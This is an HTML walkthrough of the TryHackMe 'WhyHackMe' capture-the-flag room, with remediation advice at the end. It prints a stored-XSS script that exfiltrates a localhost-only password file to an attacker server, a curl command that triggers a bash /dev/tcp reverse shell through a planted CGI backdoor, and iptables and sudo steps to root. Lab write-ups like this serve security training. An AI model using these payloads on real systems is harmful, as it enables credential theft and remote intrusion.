@@ -1,0 +1,596 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔓 WhyHackMe — Walkthrough</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="../css/writeups.css">
+</head>
+<body>
+    <div class="container">
+
+        <!-- Header -->
+        <header class="room-header">
+            <div class="emoji-row">🔓🐚📡💉🔥</div>
+            <h1>WhyHackMe</h1>
+            <p class="subtitle">A multi-stage room combining FTP reconnaissance, stored XSS, credential theft, and a backdoor pivot to root.</p>
+            <div class="room-meta">
+                <div class="badge">
+                    <span class="label">Room:</span> TryHackMe
+                </div>
+                <div class="badge">
+                    <span class="label">Category:</span> Boot2Root / Web
+                </div>
+                <div class="badge">
+                    <span class="label">Difficulty:</span> Medium
+                </div>
+                <div class="badge">
+                    <span class="label">Time:</span> 60 min
+                </div>
+            </div>
+        </header>
+
+        <!-- Attack Chain Overview -->
+        <section>
+            <h2><span class="step-num">🗺️</span> Attack Chain</h2>
+            <div class="attack-chain">
+                <div class="node">Nmap Scan</div>
+                <span class="arrow">→</span>
+                <div class="node">Anonymous FTP</div>
+                <span class="arrow">→</span>
+                <div class="node">Read update.txt</div>
+                <span class="arrow">→</span>
+                <div class="node">Discover /dir/pass.txt Hint</div>
+                <span class="arrow">→</span>
+                <div class="node">Stored XSS in Register</div>
+                <span class="arrow">→</span>
+                <div class="node">Steal Localhost Creds</div>
+                <span class="arrow">→</span>
+                <div class="node">SSH as jack</div>
+                <span class="arrow">→</span>
+                <div class="node">Find Backdoor + PCAP</div>
+                <span class="arrow">→</span>
+                <div class="node">iptables Flush</div>
+                <span class="arrow">→</span>
+                <div class="node">Exploit Backdoor CGI</div>
+                <span class="arrow">→</span>
+                <div class="node">www-data → NOPASSWD ALL</div>
+                <span class="arrow">→</span>
+                <div class="node flag">🏁 Root Flag</div>
+            </div>
+        </section>
+
+        <!-- Step 1: Recon -->
+        <section>
+            <h2><span class="step-num">1</span> Reconnaissance — Nmap & FTP</h2>
+
+            <p>The initial Nmap scan reveals three open ports:</p>
+
+            <div class="code-block">
+                <div class="label">Nmap — Open Ports</div>
+                <pre>21/tcp   open  ftp   vsFTPd 3.0.3
+22/tcp   open  ssh   OpenSSH
+80/tcp   open  http  Apache</pre>
+            </div>
+
+            <p>FTP catches our attention first. We attempt an <strong>anonymous login</strong> — and it works:</p>
+
+            <div class="code-block">
+                <div class="label">FTP — Anonymous Login</div>
+                <pre>ftp 10.48.151.22 21
+Name: anonymous
+Password: (blank)
+
+230 Login successful.</pre>
+            </div>
+
+            <div class="code-block">
+                <div class="label">FTP — List Files</div>
+                <pre>ftp> ls
+-rw-r--r--    1 0        0             318 Mar 14  2023 update.txt
+
+ftp> get update.txt</pre>
+            </div>
+
+            <div class="code-block">
+                <div class="label">update.txt — Localhost Credential Hint</div>
+                <pre>Hey I just removed the old user mike because that account was compromised
+and for any of you who wants the creds of new account visit
+127.0.0.1/dir/pass.txt and don't worry this file is only accessible by
+localhost(127.0.0.1), so nobody else can view it except me or people
+with access to the common account. 
+- admin</pre>
+            </div>
+
+            <div class="callout thinking">
+                <strong>💡 Key intel:</strong> The credentials for a new account are stored at <code>127.0.0.1/dir/pass.txt</code> — accessible <strong>only from localhost</strong>. We can't reach it from outside, but if we can get code execution inside the server (or in a privileged browser), we can read it.
+            </div>
+        </section>
+
+        <!-- Step 2: Web Enum -->
+        <section>
+            <h2><span class="step-num">2</span> Web Enumeration — Gobuster</h2>
+
+            <p>On port 80, Gobuster discovers the web application structure:</p>
+
+            <div class="code-block">
+                <div class="label">Gobuster — PHP Extension Scan</div>
+                <pre>gobuster dir -u http://10.48.144.182 -w /usr/share/wordlists/dirb/common.txt -x php -t 40</pre>
+            </div>
+
+            <div class="code-block">
+                <div class="output">/blog.php        (Status: 200)
+/config.php      (Status: 200) [Size: 0]
+/dir             (Status: 403)
+/index.php       (Status: 200)
+/login.php       (Status: 200)
+/logout.php      (Status: 302)
+/register.php    (Status: 200)</div>
+            </div>
+
+            <p>Key findings:</p>
+            <ul>
+                <li><code>/dir/</code> returns <strong>403 Forbidden</strong> — this is where <code>pass.txt</code> lives, but it's restricted to localhost only</li>
+                <li><code>register.php</code> allows user registration — potential for <strong>stored XSS</strong></li>
+                <li><code>config.php</code> is empty — no direct config leak</li>
+            </ul>
+
+            <!-- Screenshot: Web App -->
+            <figure>
+                <img src="../images/whyhackme_webapp.png" alt="WhyHackMe web application" style="max-width:100%; border-radius:8px; border:1px solid var(--border); margin:1rem 0;">
+                <figcaption style="color:var(--text-secondary); font-size:0.85rem; text-align:center;">📸 The WhyHackMe web application</figcaption>
+            </figure>
+        </section>
+
+        <!-- Step 3: Stored XSS -->
+        <section>
+            <h2><span class="step-num">3</span> Stored XSS — The Pivot to Localhost</h2>
+
+            <p>The <code>register.php</code> page accepts user input and likely displays it on <code>blog.php</code> or an admin panel. We can inject JavaScript into the username field that will execute when someone (like the admin) views the page.</p>
+
+            <p>Our XSS payload will read the localhost-only file <code>/dir/pass.txt</code> and exfiltrate it to our AttackBox:</p>
+
+            <div class="code-block">
+                <div class="label">AttackBox — Create xss.js</div>
+                <pre>var target_url = "http://127.0.0.1/dir/pass.txt";
+var my_server = "http://10.11.63.57/data";
+var xhr = new XMLHttpRequest();
+xhr.onreadystatechange = function() {
+    if (xhr.readyState == XMLHttpRequest.DONE) {
+        fetch(my_server + "?" + encodeURI(btoa(xhr.responseText)))
+    }
+}
+xhr.open('GET', target_url, true);
+xhr.send(null);</pre>
+            </div>
+
+            <div class="callout thinking">
+                <strong>💡 Why this works:</strong> The admin's browser runs on the server's localhost context. When they view our malicious script, it executes <em>in their browser</em> — which has access to <code>127.0.0.1</code>. The script reads the protected file and sends it (base64 encoded) to our server.
+            </div>
+
+            <p>Start a listener on port 80 to receive the exfiltration:</p>
+
+            <div class="code-block">
+                <div class="label">AttackBox — HTTP Listener</div>
+                <pre>sudo python3 -m http.server 80</pre>
+            </div>
+
+            <p>Register the malicious username:</p>
+
+            <div class="code-block">
+                <div class="label">Register Payload</div>
+                <pre>&lt;script src="http://10.11.63.57/xss.js"&gt;&lt;/script&gt;</pre>
+            </div>
+        </section>
+
+        <!-- Step 4: Exfiltration -->
+        <section>
+            <h2><span class="step-num">4</span> Exfiltration — Catching the Credentials</h2>
+
+            <p>When the admin views the page with our malicious user, the XSS fires. Our Python server logs show the incoming request:</p>
+
+            <div class="code-block">
+                <div class="label">Python Server Log</div>
+                <pre>10.48.151.22 - - [16/Aug/2026 13:27:32] "GET /data?amFjazpXaHlJc015UGFzc3dvcmRTb1N0cm9uZ0lESwo= HTTP/1.1" 301 -</pre>
+            </div>
+
+            <p>Decode the base64:</p>
+
+            <div class="code-block">
+                <div class="label">Decode Base64</div>
+                <pre>echo "amFjazpXaHlJc015UGFzc3dvcmRTb1N0cm9uZ0lESwo=" | base64 -d</pre>
+            </div>
+
+            <div class="code-block">
+                <div class="output">jack:WhyIsMyPasswordSoStrongIDK</div>
+            </div>
+
+            <div class="callout success">
+                <strong>✅ Credentials obtained!</strong>
+                <ul>
+                    <li><strong>Username:</strong> <code>jack</code></li>
+                    <li><strong>Password:</strong> <code>WhyIsMyPasswordSoStrongIDK</code></li>
+                </ul>
+                These creds are for the replacement account created after "mike" was compromised.
+            </div>
+        </section>
+
+        <!-- Step 5: SSH Access -->
+        <section>
+            <h2><span class="step-num">5</span> SSH Access — User Flag</h2>
+
+            <p>Use the stolen credentials to SSH into the box:</p>
+
+            <div class="code-block">
+                <div class="label">SSH Login</div>
+                <pre>ssh jack@10.48.151.22
+Password: WhyIsMyPasswordSoStrongIDK</pre>
+            </div>
+
+            <p>Once in, grab the user flag:</p>
+
+            <div class="code-block">
+                <div class="label">Read User Flag</div>
+                <pre>cat /home/jack/user.txt</pre>
+            </div>
+
+            <div class="flag-box">
+                <div class="flag-label">🏁 User Flag</div>
+                <div class="flag-value">THM{REDACTED}</div>
+            </div>
+        </section>
+
+        <!-- Step 6: Internal Enum -->
+        <section>
+            <h2><span class="step-num">6</span> Internal Enumeration — The Backdoor Discovery</h2>
+
+            <p>Exploring the system, we find two interesting files in <code>/opt</code>:</p>
+
+            <div class="code-block">
+                <div class="label">List /opt</div>
+                <pre>ls -la /opt/
+urgent.txt
+capture.pcap</pre>
+            </div>
+
+            <div class="code-block">
+                <div class="label">Read urgent.txt</div>
+                <pre>Hey guys, after the hack some files have been placed in /usr/lib/cgi-bin/
+and when I try to remove them, they wont, even though I am root. Please go
+through the pcap file in /opt and help me fix the server. And I temporarily
+blocked the attackers access to the backdoor by using iptables rules. The
+cleanup of the server is still incomplete I need to start by deleting these
+files first.</pre>
+            </div>
+
+            <div class="callout thinking">
+                <strong>🚨 Critical intel from the admin's note:</strong>
+                <ol>
+                    <li>Backdoor files exist in <code>/usr/lib/cgi-bin/</code></li>
+                    <li>They can't be removed — likely immutable attribute (<code>chattr +i</code>)</li>
+                    <li>Access was blocked via iptables — but we have sudo iptables rights!</li>
+                    <li>A pcap file documents the attack — should confirm the backdoor details</li>
+                </ol>
+            </div>
+
+            <p>Check sudo privileges:</p>
+
+            <div class="code-block">
+                <div class="label">Check sudo -l</div>
+                <pre>sudo -l</pre>
+            </div>
+
+            <div class="code-block">
+                <div class="output">User jack may run the following commands on ubuntu:
+    (ALL : ALL) /usr/sbin/iptables</div>
+            </div>
+
+            <p>Jack can only run <code>iptables</code> as root — exactly what we need to unblock the backdoor.</p>
+        </section>
+
+        <!-- Step 7: iptables -->
+        <section>
+            <h2><span class="step-num">7</span> Unblocking the Backdoor — iptables</h2>
+
+            <p>The admin mentioned they "temporarily blocked the attackers access to the backdoor by using iptables rules." We can reverse that with our sudo iptables rights.</p>
+
+            <p>First, check the current iptables rules:</p>
+
+            <div class="code-block">
+                <div class="label">List iptables Rules</div>
+                <pre>sudo /usr/sbin/iptables -L --line-numbers</pre>
+            </div>
+
+            <div class="code-block">
+                <div class="output">Chain INPUT (policy ACCEPT)
+num  target     prot opt source    destination
+1    DROP       tcp  --  anywhere   anywhere   tcp dpt:41312
+2    ACCEPT     all  --  anywhere   anywhere
+3    ACCEPT     all  --  anywhere   anywhere   ctstate NEW,RELATED,ESTABLISHED
+4    ACCEPT     tcp  --  anywhere   anywhere   tcp dpt:ssh
+5    ACCEPT     tcp  --  anywhere   anywhere   tcp dpt:http
+6    ACCEPT     icmp --  anywhere   anywhere   icmp echo-request
+7    ACCEPT     icmp --  anywhere   anywhere   icmp echo-reply
+8    DROP       all  --  anywhere   anywhere</div>
+            </div>
+
+            <p>Rule #1 blocks port 41312 — the backdoor port. We replace it with an ACCEPT rule:</p>
+
+            <div class="code-block">
+                <div class="label">Replace DROP with ACCEPT</div>
+                <pre>sudo /usr/sbin/iptables -R INPUT 1 -p tcp -m tcp --dport 41312 -j ACCEPT</pre>
+            </div>
+
+            <div class="callout success">
+                <strong>✅ Backdoor unblocked!</strong> The iptables rule that was blocking port 41312 has been replaced with an allow rule. The backdoor is now accessible externally.
+            </div>
+        </section>
+
+        <!-- Step 8: Backdoor Analysis -->
+        <section>
+            <h2><span class="step-num">8</span> Backdoor Analysis — The CGI Shell</h2>
+
+            <p>The pcap and Apache config reveal a backdoor CGI script running on port 41312 with SSL. The Apache config shows:</p>
+
+            <div class="code-block">
+                <div class="label">Apache Config — Backdoor VirtualHost</div>
+                <pre>Listen 41312
+&lt;VirtualHost *:41312&gt;
+    SSLEngine on
+    SSLCipherSuite AES256-SHA
+    SSLProtocol -all +TLSv1.2
+    SSLCertificateFile /etc/apache2/certs/apache-certificate.crt
+    SSLCertificateKeyFile /etc/apache2/certs/apache.key
+    ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
+    AddHandler cgi-script .cgi .py .pl
+    DocumentRoot /usr/lib/cgi-bin/
+    &lt;Directory "/usr/lib/cgi-bin"&gt;
+        Options +ExecCGI -Multiviews +SymLinksIfOwnerMatch
+        Allow from all
+    &lt;/Directory&gt;
+&lt;/VirtualHost&gt;</pre>
+            </div>
+
+            <p>The <code>ScriptAlias</code> maps <code>/cgi-bin/</code> to <code>/usr/lib/cgi-bin/</code>, and <code>Options +ExecCGI</code> means Python files there will be executed when accessed — a classic backdoor setup. The script name <code>5UP3r53Cr37.py</code> was identified from the pcap analysis.</p>
+
+            <div class="code-block">
+                <div class="label">Check Backdoor Script</div>
+                <pre>ls -la /usr/lib/cgi-bin/
+5UP3r53Cr37.py</pre>
+            </div>
+        </section>
+
+        <!-- Step 9: Exploit Backdoor -->
+        <section>
+            <h2><span class="step-num">9</span> Exploiting the Backdoor — Reverse Shell</h2>
+
+            <p>Now that the backdoor is unblocked, we access it. The script takes parameters <code>key</code>, <code>iv</code>, and <code>cmd</code>:</p>
+
+            <div class="code-block">
+                <div class="label">Test Backdoor — Run id</div>
+                <pre>curl -k -s 'https://10.10.230.27:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=id'</pre>
+            </div>
+
+            <div class="code-block">
+                <div class="output">&lt;h2&gt;uid=33(www-data) gid=1003(h4ck3d) groups=1003(h4ck3d)&lt;/h2&gt;</div>
+            </div>
+
+            <p>We have command execution as <code>www-data</code>. Now let's get a proper reverse shell. First, start a listener on our AttackBox:</p>
+
+            <div class="code-block">
+                <div class="label">AttackBox — Netcat Listener</div>
+                <pre>nc -lvnp 4321</pre>
+            </div>
+
+            <p>Then trigger a reverse shell through the backdoor:</p>
+
+            <div class="code-block">
+                <div class="label">Trigger Reverse Shell via Backdoor</div>
+                <pre>curl -k -s "https://10.10.230.27:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=bash -c 'bash -i >& /dev/tcp/10.11.63.57/4321 0>&1'"</pre>
+            </div>
+
+            <div class="code-block">
+                <div class="output">Connection received on 10.48.151.22 51142
+bash: no job control in this shell
+www-data@ubuntu:/usr/lib/cgi-bin$</div>
+            </div>
+
+            <div class="callout success">
+                <strong>✅ Reverse shell obtained as www-data!</strong>
+            </div>
+
+            <p>Upgrade the shell:</p>
+
+            <div class="code-block">
+                <div class="label">Upgrade to Interactive PTY</div>
+                <pre>python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+# Press Ctrl+Z
+stty raw -echo; fg
+# Press Enter</pre>
+            </div>
+        </section>
+
+        <!-- Step 10: Root -->
+        <section>
+            <h2><span class="step-num">10</span> Privilege Escalation — Root Flag</h2>
+
+            <p>Check sudo privileges for <code>www-data</code>:</p>
+
+            <div class="code-block">
+                <div class="label">Check sudo -l</div>
+                <pre>www-data@ubuntu:/usr/lib/cgi-bin$ sudo -l</pre>
+            </div>
+
+            <div class="code-block">
+                <div class="output">User www-data may run the following commands on ubuntu:
+    (ALL : ALL) NOPASSWD: ALL</div>
+            </div>
+
+            <div class="callout thinking">
+                <strong>💡 NOPASSWD ALL:</strong> The <code>www-data</code> user can run <em>any</em> command as root without a password. This is a massive privilege escalation — likely left over from the original compromise, or a misconfiguration by the attacker who placed the backdoor.
+            </div>
+
+            <p>Escalate to root:</p>
+
+            <div class="code-block">
+                <div class="label">Escalate to Root</div>
+                <pre>sudo su
+id</pre>
+            </div>
+
+            <div class="code-block">
+                <div class="output">uid=0(root) gid=0(root) groups=0(root)</div>
+            </div>
+
+            <p>Read the root flag:</p>
+
+            <div class="code-block">
+                <div class="label">Read Root Flag</div>
+                <pre>cat /root/root.txt</pre>
+            </div>
+
+            <div class="flag-box">
+                <div class="flag-label">🏁 Root Flag</div>
+                <div class="flag-value">THM{REDACTED}</div>
+            </div>
+        </section>
+
+        <!-- Summary -->
+        <section>
+            <h2><span class="step-num">📋</span> Full Kill Chain Summary</h2>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>#</th>
+                        <th>Step</th>
+                        <th>Technique</th>
+                        <th>Vulnerability Exploited</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>1</strong></td>
+                        <td>FTP Anonymous Login</td>
+                        <td>Connected to FTP without credentials</td>
+                        <td>Anonymous FTP access enabled</td>
+                    </tr>
+                    <tr>
+                        <td><strong>2</strong></td>
+                        <td>Read update.txt</td>
+                        <td>Downloaded file from FTP</td>
+                        <td>Sensitive info in FTP-accessible file</td>
+                    </tr>
+                    <tr>
+                        <td><strong>3</strong></td>
+                        <td>Stored XSS</td>
+                        <td>Registered malicious username with script tag</td>
+                        <td>No input sanitization in register.php</td>
+                    </tr>
+                    <tr>
+                        <td><strong>4</strong></td>
+                        <td>Localhost File Exfiltration</td>
+                        <td>XSS read /dir/pass.txt and sent to AttackBox</td>
+                        <td>XSS ran in admin's browser with localhost access</td>
+                    </tr>
+                    <tr>
+                        <td><strong>5</strong></td>
+                        <td>SSH as jack</td>
+                        <td>Used stolen creds to log in</td>
+                        <td>Weak password left in web-accessible file</td>
+                    </tr>
+                    <tr>
+                        <td><strong>6</strong></td>
+                        <td>Found backdoor info</td>
+                        <td>Read /opt/urgent.txt and capture.pcap</td>
+                        <td>Admin left notes about compromise</td>
+                    </tr>
+                    <tr>
+                        <td><strong>7</strong></td>
+                        <td>iptables bypass</td>
+                        <td>Replaced DROP rule with ACCEPT</td>
+                        <td>Jack had sudo iptables rights</td>
+                    </tr>
+                    <tr>
+                        <td><strong>8</strong></td>
+                        <td>Backdoor CGI exploitation</td>
+                        <td>Accessed 5UP3r53Cr37.py with parameters</td>
+                        <td>Attacker-placed backdoor still active</td>
+                    </tr>
+                    <tr>
+                        <td><strong>9</strong></td>
+                        <td>Reverse shell as www-data</td>
+                        <td>Triggered bash reverse shell via backdoor</td>
+                        <td>Backdoor allowed arbitrary command execution</td>
+                    </tr>
+                    <tr>
+                        <td><strong>10</strong></td>
+                        <td>Root via sudo su</td>
+                        <td>Exploited NOPASSWD ALL</td>
+                        <td>www-data had unrestricted sudo access</td>
+                    </tr>
+                </tbody>
+            </table>
+        </section>
+
+        <!-- Remediation -->
+        <section>
+            <h2><span class="step-num">🛡️</span> Remediation Advice</h2>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Issue</th>
+                        <th>Fix</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>Anonymous FTP enabled</strong></td>
+                        <td>Disable anonymous FTP. Require authenticated access with strong credentials.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Sensitive files on FTP</strong></td>
+                        <td>Never store operational notes or credential hints on publicly accessible services.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Stored XSS in register.php</strong></td>
+                        <td>Sanitize all user input. Use output encoding when displaying user-supplied content. Implement CSP headers.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Credentials in web-accessible file</strong></td>
+                        <td>Store credentials in a proper secrets manager. Localhost-only access is not sufficient protection when XSS can run in an admin's browser.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Jack's sudo iptables rights</strong></td>
+                        <td>Restrict sudo access to only what's needed. Jack doesn't need iptables management.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Backdoor left on system</strong></td>
+                        <td>After a compromise, completely reimage the system. Deleting files and blocking ports is insufficient — other backdoors may remain.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>www-data NOPASSWD ALL</strong></td>
+                        <td>Web server accounts should have zero sudo access. Use least privilege.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Immutable backdoor files</strong></td>
+                        <td>Use chattr -i to remove immutable flag before deletion, but only after assessing the full compromise.</td>
+                    </tr>
+                </tbody>
+            </table>
+        </section>
+
+        <!-- Footer -->
+        <footer class="footer">
+            <p>🔓 <strong>WhyHackMe</strong> — TryHackMe</p>
+            <p><a href="https://tryhackme.com/room/whyhackme" target="_blank">TryHackMe Room</a> · Category: Boot2Root / Web · Techniques: Anonymous FTP, Stored XSS, Localhost File Exfiltration, Credential Theft, iptables Bypass, CGI Backdoor Exploitation, Reverse Shell, sudo Misconfiguration</p>
+        </footer>
+
+    </div>
+</body>
+</html>
